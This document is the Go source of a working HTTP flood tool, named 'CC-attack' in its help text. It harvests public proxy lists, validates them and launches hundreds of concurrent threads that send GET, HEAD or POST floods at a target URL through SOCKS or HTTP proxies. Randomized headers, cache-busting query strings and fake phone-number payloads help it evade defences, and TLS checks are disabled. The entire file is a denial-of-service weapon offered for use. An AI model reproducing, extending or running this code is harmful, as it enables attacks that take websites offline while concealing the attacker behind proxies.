package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"regexp" // 用于正则匹配替换
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/proxy"
)

// ==========================================
// 全局变量定义
// ==========================================

var acceptall = []string{
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\n",
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\n",
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.9\r\nAccept-Encoding: gzip, deflate\r\n",
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.9\r\n",
}

var referers = []string{
	"https://www.google.com/",
	"https://www.bing.com/",
	"https://www.baidu.com/",
	"https://www.yandex.com/",
	"https://duckduckgo.com/",
	"https://www.facebook.com/",
	"https://twitter.com/",
	"https://www.instagram.com/",
	"https://www.youtube.com/",
	"https://www.reddit.com/",
}

// Default value
var (
	mode       = "cc"
	proxy_ver  = "5"
	brute      = false
	out_file   = "proxy.txt"
	thread_num = 800
	data       = ""
	cookies    = ""
	proxies    []string // 全局代理列表
	
	// 检查限制 (-n)
	checkLimit = 0
	// 超时设置 (-ms), 默认为10秒
	timeoutSec = 10
	
	// 解析后的 URL 变量
	target   string
	path     string
	port     int
	protocol string

	// 新增：强制解析 IP
	forceResolveIP = ""
)

func Intn(min, max int) int {
	if max <= min {
		return min
	}
	// 使用 int64 避免 32 位系统溢出
	return min + int(rand.Int63n(int64(max-min)))
}

func Choice(items []string) string {
	if len(items) == 0 {
		return ""
	}
	return items[rand.Intn(len(items))]
}

func randomURandom(length int) string {
	bytes := make([]byte, length)
	rand.Read(bytes)
	return string(bytes)
}

// ==========================================
// 随机生成逻辑
// ==========================================

const (
	charsetNum   = "0123456789"
	charsetAlpha = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	charsetMix   = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
)

// 中国手机号段定义
var mobilePrefixes = []string{
	// 中国移动
	"134", "135", "136", "137", "138", "139", "147", "150", "151", "152", "157", "158", "159", "178", "182", "183", "184", "187", "188", "198",
	// 中国联通
	"130", "131", "132", "155", "156", "166", "175", "176", "185", "186",
	// 中国电信
	"133", "153", "173", "177", "180", "181", "189", "199",
}

// 生成指定模式和长度的随机字符串
func generateRandomString(mode string, length int) string {
	var charset string
	switch mode {
	case "num":
		charset = charsetNum
	case "alpha":
		charset = charsetAlpha
	case "mix":
		charset = charsetMix
	default:
		charset = charsetMix
	}

	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

// 生成随机中国手机号
func generateRandomPhone() string {
	prefix := Choice(mobilePrefixes)
	suffix := generateRandomString("num", 8)
	return prefix + suffix
}

// 处理数据模板，替换标签（支持 POST 数据、Cookie 和 URL Path）
func processDataTemplate(template string) string {
	// 1. 处理随机字符串 {rand:mode:length}
	reStr := regexp.MustCompile(`\{rand:(num|alpha|mix):(\d+)\}`)
	template = reStr.ReplaceAllStringFunc(template, func(match string) string {
		submatches := reStr.FindStringSubmatch(match)
		if len(submatches) == 3 {
			mode := submatches[1]
			length, err := strconv.Atoi(submatches[2])
			if err != nil {
				return match 
			}
			return generateRandomString(mode, length)
		}
		return match
	})

	// 2. 处理随机手机号 {rand:phone}
	rePhone := regexp.MustCompile(`\{rand:phone\}`)
	template = rePhone.ReplaceAllStringFunc(template, func(match string) string {
		return generateRandomPhone()
	})

	return template
}

// ==========================================
// 核心逻辑函数
// ==========================================

func build_threads(mode string, thread_num int, startChan chan struct{}, proxy_type int) {
	for i := 0; i < thread_num; i++ {
		if mode == "post" {
			go post(startChan, proxy_type)
		} else if mode == "cc" {
			go cc(startChan, proxy_type)
		} else if mode == "head" {
			go head(startChan, proxy_type)
		}
	}
}

// 更新为现代浏览器 UA
func getuseragent() string {
	uaList := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
	}
	return Choice(uaList)
}

func randomurl() string {
	return strconv.Itoa(Intn(10000000, 99999999)) // 简化随机数生成
}

// 修改：增加 currentPath 参数，使得 POST 方法也能正确引用处理后的 path
func GenReqHeader(method string, currentPath string) string {
	header := ""
	
	// 处理 Cookie 随机变量
	currentCookies := cookies
	if currentCookies != "" {
		currentCookies = processDataTemplate(currentCookies)
	}

	if method == "get" || method == "head" {
		connection := "Connection: Keep-Alive\r\n"
		if currentCookies != "" {
			connection += "Cookie: " + currentCookies + "\r\n"
		}
		accept := Choice(acceptall)
		referer := "Referer: " + Choice(referers) + "\r\n" // 简化 Referer，避免循环引用
		useragent := "User-Agent: " + getuseragent() + "\r\n"
		header = referer + useragent + accept + connection + "\r\n"
	} else if method == "post" {
		// 使用传入的 currentPath
		post_host := "POST " + currentPath + " HTTP/1.1\r\nHost: " + target + "\r\n"
		content := "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
		refer := "Referer: " + protocol + "://" + target + currentPath + "\r\n"
		user_agent := "User-Agent: " + getuseragent() + "\r\n"
		accept := Choice(acceptall)
		
		payload := ""
		if data == "" {
			payload = randomURandom(16)
		} else {
			payload = processDataTemplate(data)
		}
		
		length := "Content-Length: " + strconv.Itoa(len(payload)) + " \r\nConnection: Keep-Alive\r\n"
		if currentCookies != "" {
			length += "Cookie: " + currentCookies + "\r\n"
		}
		
		header = post_host + accept + refer + content + user_agent + length + "\n" + payload + "\r\n\r\n"
	}
	return header
}

func ParseUrl(original_url string) {
	original_url = strings.TrimSpace(original_url)
	url_tmp := ""
	path = "/"
	port = 80
	protocol = "http"
	
	if strings.HasPrefix(original_url, "http://") {
		url_tmp = original_url[7:]
	} else if strings.HasPrefix(original_url, "https://") {
		url_tmp = original_url[8:]
		protocol = "https"
	} else {
		fmt.Println("> That looks like not a correct url.")
		os.Exit(0)
	}

	tmp := strings.Split(url_tmp, "/")
	website := tmp[0]
	check := strings.Split(website, ":")
	if len(check) > 1 {
		p, _ := strconv.Atoi(check[1])
		port = p
		target = check[0]
	} else {
		if protocol == "https" {
			port = 443
		}
		target = website
	}
	
	if len(tmp) > 1 {
		// 重建 path，确保格式正确
		path = "/" + strings.Join(tmp[1:], "/")
	}
}

func createSocket(proxy_type int, proxy_ip string, proxy_port int) (net.Conn, error) {
	connectHost := target
	if forceResolveIP != "" {
		connectHost = forceResolveIP
	}

	addr := fmt.Sprintf("%s:%d", connectHost, port)
	timeout := 10 * time.Second 

	if proxy_type == 0 { 
		proxyAddr := fmt.Sprintf("%s:%d", proxy_ip, proxy_port)
		conn, err := net.DialTimeout("tcp", proxyAddr, timeout)
		if err != nil {
			return nil, err
		}

		connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", addr, addr)
		conn.SetDeadline(time.Now().Add(timeout))
		_, err = conn.Write([]byte(connectReq))
		if err != nil {
			conn.Close()
			return nil, err
		}

		buf := make([]byte, 1024)
		n, err := conn.Read(buf)
		if err != nil {
			conn.Close()
			return nil, err
		}
		
		conn.SetDeadline(time.Time{})

		if !strings.Contains(string(buf[:n]), "200") {
			conn.Close()
			return nil, fmt.Errorf("proxy handshake failed: %s", string(buf[:n]))
		}

		if protocol == "https" {
			tlsConfig := &tls.Config{
				InsecureSkipVerify: true,
				ServerName:         target, 
			}
			conn = tls.Client(conn, tlsConfig)
		}

		return conn, nil
	}

	var d proxy.Dialer
	var err error

	if proxy_type == 5 || proxy_type == 4 {
		d, err = proxy.SOCKS5("tcp", fmt.Sprintf("%s:%d", proxy_ip, proxy_port), nil, proxy.Direct)
	}
	
	if err != nil {
		return nil, err
	}

	conn, err := d.Dial("tcp", addr)
	if err != nil {
		return nil, err
	}
	
	if protocol == "https" && proxy_type != 0 {
		tlsConfig := &tls.Config{
			InsecureSkipVerify: true,
			ServerName:         target, 
		}
		conn = tls.Client(conn, tlsConfig)
	}
	
	return conn, nil
}

func cc(startChan chan struct{}, proxy_type int) {
	proxy_str := strings.TrimSpace(Choice(proxies))
	proxy_parts := strings.Split(proxy_str, ":")
	if len(proxy_parts) < 2 { return }

	<-startChan
	
	for {
		p_port, _ := strconv.Atoi(proxy_parts[1])
		s, err := createSocket(proxy_type, proxy_parts[0], p_port)
		
		if err == nil {
			// 在连接建立后，生成 Header (Connection, User-Agent等)
			// 注意：GenReqHeader 这里只生成公共头部，不包含 Request Line (GET /... HTTP/1.1)
			header := GenReqHeader("get", path) 
			
			for i := 0; i < 100; i++ {
				// ================= URL 随机化处理 =================
				// 1. 处理用户定义的 {rand} 标签
				currentPath := processDataTemplate(path)

				// 2. 动态判断连接符
				add := "?"
				if strings.Contains(currentPath, "?") {
					add = "&"
				}

				// 3. 拼接最终 URL：路径 + 连接符 + 随机防缓存数字
				finalUrl := currentPath + add + randomurl()

				get_host := "GET " + finalUrl + " HTTP/1.1\r\nHost: " + target + "\r\n"
				request := get_host + header
				// ===============================================
				
				_, err := s.Write([]byte(request))
				if err != nil {
					proxy_str = strings.TrimSpace(Choice(proxies))
					proxy_parts = strings.Split(proxy_str, ":")
					break
				}
			}
			s.Close()
		} else {
			proxy_str = strings.TrimSpace(Choice(proxies))
			proxy_parts = strings.Split(proxy_str, ":")
		}
	}
}

func head(startChan chan struct{}, proxy_type int) {
	proxy_str := strings.TrimSpace(Choice(proxies))
	proxy_parts := strings.Split(proxy_str, ":")
	if len(proxy_parts) < 2 { return }

	<-startChan

	for {
		p_port, _ := strconv.Atoi(proxy_parts[1])
		s, err := createSocket(proxy_type, proxy_parts[0], p_port)
		
		if err == nil {
			header := GenReqHeader("head", path)
			
			for i := 0; i < 100; i++ {
				currentPath := processDataTemplate(path)
				
				add := "?"
				if strings.Contains(currentPath, "?") {
					add = "&"
				}

				finalUrl := currentPath + add + randomurl()
				
				head_host := "HEAD " + finalUrl + " HTTP/1.1\r\nHost: " + target + "\r\n"
				request := head_host + header

				_, err := s.Write([]byte(request))
				if err != nil {
					proxy_str = strings.TrimSpace(Choice(proxies))
					proxy_parts = strings.Split(proxy_str, ":")
					break
				}
			}
			s.Close()
		} else {
			proxy_str = strings.TrimSpace(Choice(proxies))
			proxy_parts = strings.Split(proxy_str, ":")
		}
	}
}

func post(startChan chan struct{}, proxy_type int) {
	proxy_str := strings.TrimSpace(Choice(proxies))
	proxy_parts := strings.Split(proxy_str, ":")
	if len(proxy_parts) < 2 { return }

	<-startChan

	for {
		p_port, _ := strconv.Atoi(proxy_parts[1])
		s, err := createSocket(proxy_type, proxy_parts[0], p_port)
		
		if err == nil {
			// POST 方法需要在循环内生成所有内容，包括 Body 和 Path
			for i := 0; i < 100; i++ {
				currentPath := processDataTemplate(path)
				request := GenReqHeader("post", currentPath) 
				
				_, err := s.Write([]byte(request))
				if err != nil {
					proxy_str = strings.TrimSpace(Choice(proxies))
					proxy_parts = strings.Split(proxy_str, ":")
					break
				}
			}
			s.Close()
		} else {
			proxy_str = strings.TrimSpace(Choice(proxies))
			proxy_parts = strings.Split(proxy_str, ":")
		}
	}
}

// ==========================================
// 代理检测与下载逻辑
// ==========================================

var checkedNums = 0
var validNums = 0
var validProxies []string
var checkMutex sync.Mutex
var stopCheck = false

func checkOneProxy(line string, proxy_type int, timeout time.Duration) bool {
	p_parts := strings.Split(strings.TrimSpace(line), ":")
	if len(p_parts) != 2 {
		return false
	}

	resultChan := make(chan bool, 1)

	go func() {
		p_port, _ := strconv.Atoi(p_parts[1])
		proxyAddr := fmt.Sprintf("%s:%d", p_parts[0], p_port)
		targetTest := "1.1.1.1:80"

		var conn net.Conn
		var err error

		if proxy_type == 5 || proxy_type == 4 {
			dialer := &net.Dialer{
				Timeout:   timeout,
				KeepAlive: -1,
			}
			var d proxy.Dialer
			d, err = proxy.SOCKS5("tcp", proxyAddr, nil, dialer)
			if err == nil {
				conn, err = d.Dial("tcp", targetTest)
			}
		} else {
			conn, err = net.DialTimeout("tcp", proxyAddr, timeout)
			if err == nil {
				conn.SetDeadline(time.Now().Add(timeout))
				connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", targetTest, targetTest)
				_, err = conn.Write([]byte(connectReq))
				
				if err == nil {
					buf := make([]byte, 1024)
					var n int
					n, err = conn.Read(buf)
					
					if err != nil || !strings.Contains(string(buf[:n]), "200") {
						conn.Close()
						resultChan <- false
						return
					}
				}
			}
		}

		if err != nil {
			resultChan <- false
			return
		}

		conn.SetDeadline(time.Now().Add(timeout)) 
		_, err = conn.Write([]byte("GET / HTTP/1.1\r\nHost: 1.1.1.1\r\n\r\n"))
		if err != nil {
			conn.Close()
			resultChan <- false
			return
		}

		buf := make([]byte, 1024)
		n, err := conn.Read(buf)
		conn.Close()
		
		resultChan <- (n > 0)
	}()

	select {
	case res := <-resultChan:
		return res
	case <-time.After(timeout):
		return false
	}
}

func checking(lines string, proxy_type int, ms int, wg *sync.WaitGroup) {
	defer wg.Done()
	if stopCheck { return }

	timeout := time.Duration(ms) * time.Second
	isValid := checkOneProxy(lines, proxy_type, timeout)

	checkMutex.Lock()
	checkedNums++
	if isValid {
		validNums++
		validProxies = append(validProxies, lines)
		if checkLimit > 0 && validNums >= checkLimit {
			stopCheck = true
		}
	}
	
	targetStr := "ALL"
	if checkLimit > 0 {
		targetStr = strconv.Itoa(checkLimit)
	}
	fmt.Printf("\r> Checked %d | Valid %d (Target: %s)", checkedNums, validNums, targetStr)
	checkMutex.Unlock()
}

func check_socks(ms int) {
	maxConcurrency := 2000 
	sem := make(chan struct{}, maxConcurrency) 

	var wg sync.WaitGroup
	fmt.Println("> Checking proxies...")
	
	checkMutex.Lock()
	checkedNums = 0
	validNums = 0
	validProxies = []string{}
	stopCheck = false
	checkMutex.Unlock()

	for _, line := range proxies {
		if stopCheck {
			break
		}

		wg.Add(1)
		sem <- struct{}{} 
		
		pt := 5
		if proxy_ver == "4" { pt = 4 }
		if proxy_ver == "http" { pt = 0 }
		
		go func(l string, p int) {
			defer func() { <-sem }() 
			checking(l, p, ms, &wg)
		}(line, pt)
	}
	wg.Wait()
	
	fmt.Printf("\n> Finished. Total Valid: %d\n", len(validProxies))

	if len(validProxies) > 0 {
		f, err := os.Create(out_file)
		if err == nil {
			defer f.Close()
			for _, vp := range validProxies {
				f.WriteString(vp + "\n")
			}
			fmt.Printf("> Saved %d valid proxies to %s\n", len(validProxies), out_file)
			proxies = validProxies
		}
	} else {
		fmt.Println("> No valid proxies found.")
	}
}

func check_list(socks_file string) {
	fmt.Println("> Checking list")
	content, err := os.ReadFile(socks_file)
	if err != nil { return }
	
	temp_list := []string{}
	lines := strings.Split(string(content), "\n")
	
	seen := make(map[string]bool)
	
	for _, i := range lines {
		i = strings.TrimSpace(i)
		if i == "" { continue }
		if !seen[i] {
			if strings.Contains(i, ":") && !strings.Contains(i, "#") {
				parts := strings.Split(i, ":")
				if net.ParseIP(parts[0]) != nil {
					temp_list = append(temp_list, i)
					seen[i] = true
				}
			}
		}
	}
	
	f, _ := os.Create(socks_file)
	defer f.Close()
	for _, i := range temp_list {
		f.WriteString(i + "\n")
	}
}

func DownloadProxies(proxy_ver string) {
	f, err := os.Create(out_file)
	if err != nil { return }
	defer f.Close()
	
	var api_list []string

	if proxy_ver == "4" {
		api_list = []string{
			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4",
			"https://openproxylist.xyz/socks4.txt",
			"https://proxyspace.pro/socks4.txt",
			"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
			"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
			"https://www.proxy-list.download/api/v1/get?type=socks4",
			"https://www.proxyscan.io/download?type=socks4",
			"https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",
			"https://api.openproxylist.xyz/socks4.txt",
		}
	} else if proxy_ver == "5" {
		api_list = []string{
			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",
			"https://www.proxy-list.download/api/v1/get?type=socks5",
			"https://www.proxyscan.io/download?type=socks5",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
			"https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
			"https://api.openproxylist.xyz/socks5.txt",
			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5",
			"https://openproxylist.xyz/socks5.txt",
			"https://proxyspace.pro/socks5.txt",
			"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
			"https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt",
			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
			"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5.txt",
		}
	} else if proxy_ver == "http" {
		api_list = []string{
			"https://api.proxyscrape.com/?request=displayproxies&proxytype=http",
			"https://www.proxy-list.download/api/v1/get?type=http",
			"https://www.proxyscan.io/download?type=http",
			"https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
			"https://api.openproxylist.xyz/http.txt",
			"https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt",
			"http://alexa.lr2b.com/proxylist.txt",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
			"https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
			"https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
			"https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
			"https://proxy-spider.com/api/proxies.example.txt",
			"https://multiproxy.org/txt_all/proxy.txt",
			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
			"https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt",
			"https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/https.txt",
			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
			"https://openproxylist.xyz/http.txt",
			"https://proxyspace.pro/http.txt",
			"https://proxyspace.pro/https.txt",
			"https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
			"https://raw.githubusercontent.com/aslisk/proxyhttps/main/https.txt",
			"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt",
			"https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Repo/master/proxy_list.txt",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
			"https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
			"https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
			"https://raw.githubusercontent.com/RX4096/proxy-list/main/online/http.txt",
			"https://raw.githubusercontent.com/RX4096/proxy-list/main/online/https.txt",
			"https://raw.githubusercontent.com/saisuiu/uiu/main/free.txt",
			"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/http.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
			"https://rootjazz.com/proxies/proxies.txt",
			"https://sheesh.rip/http.txt",
			"https://www.proxy-list.download/api/v1/get?type=https",
		}
	}

	fmt.Println("> Downloading proxies...")
	for _, api := range api_list {
		resp, err := http.Get(api)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		f.Write(body)
		f.Write([]byte("\n")) 
		resp.Body.Close()
		fmt.Println("> Fetched from:", api)
	}
	fmt.Println("> Have already downloaded proxies list as " + out_file)
}

func PrintHelp() {
	fmt.Println(`===============  CC-attack help list  ===============
   -h/help   | showing this message
   -url      | set target url
   -m/mode   | set program mode
   -resolve  | force resolve domain to ip (e.g., -resolve 1.2.3.4)
   -data     | set post data path (only works on post mode)
             | (Example: -data data.json)
   -cookies  | set cookies (Example: 'id:xxx;ua:xxx')
   -v        | set proxy type (4/5/http, default:5)
   -t        | set threads number (default:800)
   -f        | set proxies file (default:proxy.txt)
   -b        | enable/disable brute mode
             | Enable=1 Disable=0  (default:0)
   -s        | set attack time(default:60)
   -n        | set target valid proxies number (e.g. -n 1000)
   -ms       | set check timeout in seconds (default: 10)
   -down     | download proxies
   -check    | check proxies
=====================================================`)
}

func main() {
	rand.Seed(time.Now().UnixNano()) 
	args := os.Args
	check_proxies := false
	download_socks := false
	proxy_type := 5
	period := 60
	show_help := false

	fmt.Println("> Mode: [cc/post/head]")

	for n, arg := range args {
		if arg == "-help" || arg == "-h" {
			show_help = true
		}
		if arg == "-url" {
			if n+1 < len(args) { ParseUrl(args[n+1]) }
		}
		if arg == "-m" || arg == "-mode" {
			if n+1 < len(args) { mode = args[n+1] }
		}
		if arg == "-resolve" {
			// 修改：只接受 IP 参数
			if n+1 < len(args) {
				forceResolveIP = args[n+1]
				fmt.Printf("> Force Resolve Enabled: Target will be connected via IP %s\n", forceResolveIP)
			}
		}
		if arg == "-v" {
			if n+1 < len(args) {
				proxy_ver = args[n+1]
				if proxy_ver == "4" {
					proxy_type = 4
				} else if proxy_ver == "5" {
					proxy_type = 5
				} else if proxy_ver == "http" {
					proxy_type = 0
				}
			}
		}
		if arg == "-b" {
			// brute logic omitted
		}
		if arg == "-t" {
			if n+1 < len(args) {
				t, err := strconv.Atoi(args[n+1])
				if err == nil { thread_num = t }
			}
		}
		if arg == "-cookies" {
			if n+1 < len(args) { cookies = args[n+1] }
		}
		if arg == "-data" {
			if n+1 < len(args) {
				content, err := os.ReadFile(args[n+1])
				if err == nil {
					data = string(content)
				}
			}
		}
		if arg == "-f" {
			if n+1 < len(args) { out_file = args[n+1] }
		}
		if arg == "-down" {
			download_socks = true
		}
		if arg == "-check" {
			check_proxies = true
		}
		if arg == "-s" {
			if n+1 < len(args) {
				p, err := strconv.Atoi(args[n+1])
				if err == nil { period = p }
			}
		}
		if arg == "-n" {
			if n+1 < len(args) {
				num, err := strconv.Atoi(args[n+1])
				if err == nil { checkLimit = num }
			}
		}
		if arg == "-ms" {
			if n+1 < len(args) {
				ms, err := strconv.Atoi(args[n+1])
				if err == nil { timeoutSec = ms }
			}
		}
	}

	if download_socks {
		DownloadProxies(proxy_ver)
	}

	if _, err := os.Stat(out_file); os.IsNotExist(err) {
		fmt.Println("Proxies file not found")
		return
	}

	content, _ := os.ReadFile(out_file)
	lines := strings.Split(string(content), "\n")
	for _, l := range lines {
		if strings.TrimSpace(l) != "" {
			proxies = append(proxies, l)
		}
	}
	
	check_list(out_file)
	
	if len(proxies) == 0 {
		fmt.Println("> There are no more proxies. Please download a new proxies list.")
		return
	}
	
	fmt.Printf("> Number Of Proxies: %d\n", len(proxies))
	
	if check_proxies {
		check_socks(timeoutSec)
	}
	
	if show_help {
		PrintHelp()
	}
	
	if target == "" {
		fmt.Println("> There is no target. End of process ")
		return
	}

	startChan := make(chan struct{})
	fmt.Println("> Building threads...")
	build_threads(mode, thread_num, startChan, proxy_type)
	
	close(startChan) 
	
	fmt.Println("> Flooding...")
	time.Sleep(time.Duration(period) * time.Second)
}

